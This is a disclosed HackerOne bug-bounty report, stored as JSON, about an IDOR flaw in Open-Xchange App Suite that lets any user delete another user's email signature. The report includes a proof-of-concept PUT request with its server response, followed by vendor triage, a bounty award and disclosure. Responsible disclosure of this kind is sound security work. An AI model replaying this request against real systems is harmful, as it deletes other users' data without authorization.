{"id":199321,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTkzMjE=","url":"https://hackerone.com/reports/199321","title":"IDOR - Deleting other user's signature via /appsuite/api/snippet?action=update (although an error is thrown)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-01-18T11:02:48.871Z","submitted_at":"2017-01-18T11:02:48.871Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"inhibitor181","url":"/inhibitor181","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-28T07:19:45.686Z","bug_reporter_agreed_on_going_public_at":"2017-08-29T07:19:43.656Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello again, I have found that everybody can delete everybody's signature via a malformed PUT request in `/appsuite/api/snippet?action=update`. Although a processing error is thrown, the targeted signature is deleted.\n\nPOC\n------------------\n```\nPUT /appsuite/api/snippet?action=update\u0026id=7\u0026session=374be123c3f142ab8a63724bc62042e3 HTTP/1.1\nHost: sandbox.open-xchange.com\n/**/\n\n{\"id\":\"7\",\"misc\":{\"insertion\":\"below\",\"content-type\":\"text/html\"},\"content\":\"\u003cp\u003e\u0026nbsp;test24\u003cbr\u003e\u003c/p\u003e\",\"displayname\":\"test23\"}\n```\n\nResponse\n\n```\nHTTP/1.1 200 OK\nServer: nginx\n/**.\n\n\n{\"error\":\"An error occurred inside the server which prevented it from fulfilling the request.\",\"error_params\":[\"7\"],\"categories\":\"ERROR\",\"category\":8,\"code\":\"SNIPPET-0003\",\"error_id\":\"1561167371-118675\",\"error_desc\":\"No such snippet found for identifier: 7\"}\n```\n\nVideo POC attached.\n\nPS : Out of trial reports for now until you resolve 1 or 2 of them, so you probably won't hear from me for some time :)","vulnerability_information_html":"\u003cp\u003eHello again, I have found that everybody can delete everybody\u0026#39;s signature via a malformed PUT request in \u003ccode\u003e/appsuite/api/snippet?action=update\u003c/code\u003e. Although a processing error is thrown, the targeted signature is deleted.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePOC\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePUT /appsuite/api/snippet?action=update\u0026amp;id=7\u0026amp;session=374be123c3f142ab8a63724bc62042e3 HTTP/1.1\nHost: sandbox.open-xchange.com\n/**/\n\n{\u0026quot;id\u0026quot;:\u0026quot;7\u0026quot;,\u0026quot;misc\u0026quot;:{\u0026quot;insertion\u0026quot;:\u0026quot;below\u0026quot;,\u0026quot;content-type\u0026quot;:\u0026quot;text/html\u0026quot;},\u0026quot;content\u0026quot;:\u0026quot;\u0026lt;p\u0026gt;\u0026amp;nbsp;test24\u0026lt;br\u0026gt;\u0026lt;/p\u0026gt;\u0026quot;,\u0026quot;displayname\u0026quot;:\u0026quot;test23\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx\n/**.\n\n\n{\u0026quot;error\u0026quot;:\u0026quot;An error occurred inside the server which prevented it from fulfilling the request.\u0026quot;,\u0026quot;error_params\u0026quot;:[\u0026quot;7\u0026quot;],\u0026quot;categories\u0026quot;:\u0026quot;ERROR\u0026quot;,\u0026quot;category\u0026quot;:8,\u0026quot;code\u0026quot;:\u0026quot;SNIPPET-0003\u0026quot;,\u0026quot;error_id\u0026quot;:\u0026quot;1561167371-118675\u0026quot;,\u0026quot;error_desc\u0026quot;:\u0026quot;No such snippet found for identifier: 7\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eVideo POC attached.\u003c/p\u003e\n\n\u003cp\u003ePS : Out of trial reports for now until you resolve 1 or 2 of them, so you probably won\u0026#39;t hear from me for some time :)\u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-09-28T07:19:43.704Z","allow_singular_disclosure_after":-102634382.4494734,"singular_disclosure_allowed":true,"vote_count":18,"voters":["jensec","sourc7","bl4de","vijay_kumar","mpz","eveeez","r3y","realtess","mr_r3boot","japz","and 8 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1427372,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Great report, thanks! I'll close those as \"Resolved\" to award reputation and get you past that trial report limit. Note however that we're not using HackerOne to track resolution and deployment so the issue might not be solved on sandbox any time soon.","markdown_message":"\u003cp\u003eGreat report, thanks! I\u0026#39;ll close those as \u0026quot;Resolved\u0026quot; to award reputation and get you past that trial report limit. Note however that we\u0026#39;re not using HackerOne to track resolution and deployment so the issue might not be solved on sandbox any time soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T12:59:54.993Z","updated_at":"2017-01-18T12:59:54.993Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1427376,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as Resolved since no further information is required, note that we're still working on this.","markdown_message":"\u003cp\u003eClosing as Resolved since no further information is required, note that we\u0026#39;re still working on this.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T13:01:27.816Z","updated_at":"2017-01-18T13:01:27.816Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"inhibitor181","url":"/inhibitor181"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1427397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mheiland . Thank you for closing those reports as resolved faster then you should have to get my Signal \u003e 1 ! I hope this won't disrupt your normal processing flow.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mheiland\"\u003e@mheiland\u003c/a\u003e . Thank you for closing those reports as resolved faster then you should have to get my Signal \u0026gt; 1 ! I hope this won\u0026#39;t disrupt your normal processing flow.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T13:07:09.286Z","updated_at":"2017-01-18T13:07:09.286Z","actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1427430,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Not at all, i just want to manage expectations, specifically that the fix is not yet done or deployed. So it does not make sense to re-test or find bypasses yet.","markdown_message":"\u003cp\u003eNot at all, i just want to manage expectations, specifically that the fix is not yet done or deployed. So it does not make sense to re-test or find bypasses yet.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T13:23:27.642Z","updated_at":"2017-01-18T13:23:27.642Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1429559,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-19T09:44:40.012Z","updated_at":"2017-01-19T09:44:40.012Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"inhibitor181","url":"/inhibitor181"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1429584,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mheiland Thanks for the bounty! As always, tell me when this is resolved in sandbox and I am happy to test the fix","markdown_message":"\u003cp\u003e\u003ca href=\"/mheiland\"\u003e@mheiland\u003c/a\u003e Thanks for the bounty! As always, tell me when this is resolved in sandbox and I am happy to test the fix\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-19T09:55:48.982Z","updated_at":"2017-01-19T09:55:48.982Z","actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1962204,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-29T07:19:43.675Z","updated_at":"2017-08-29T07:19:43.675Z","first_to_agree":true,"actor":{"username":"inhibitor181","cleared":true,"url":"/inhibitor181","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2029275,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-28T07:19:45.706Z","updated_at":"2017-09-28T07:19:45.706Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4916995,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-24T12:18:56.686Z","updated_at":"2019-05-24T12:18:56.686Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":401096},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}